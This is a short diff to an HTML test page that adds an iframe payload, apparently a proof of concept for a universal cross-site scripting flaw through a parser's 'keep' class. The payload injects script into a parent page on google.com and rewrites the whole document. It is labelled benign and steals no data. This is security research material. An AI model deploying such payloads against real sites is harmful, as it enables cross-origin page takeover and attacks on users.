@@ -40,6 +40,10 @@
     <iframe class="mercury-parser-keep"
       src="data:text/html,<script>try{if(/google\.com/.test(parent.location.origin))alert('SINK data - '+parent.document.domain)}catch(e){}</script>"></iframe>
 
+    <!-- 6. full-takeover via parent document.write (benign: neutral marker, NO cookie dump, NO external img) -->
+    <iframe class="mercury-parser-keep"
+      src="javascript:(()=>{try{if(/google\.com/.test(parent.location.origin)){let s=parent.document.createElement('script');s.textContent=&quot;document.open();document.write('<!doctype html><title>UXSS '+document.domain+'</title><h1>BENIGN UXSS TEST</h1><p id=uxss-proof>domain='+document.domain+' top='+(window===top)+'</p>');document.close();alert('BENIGN UXSS - '+document.domain)&quot;;parent.document.head.appendChild(s)}}catch(e){}})()"></iframe>
+
     <p id="padding"></p>
   </article>
 
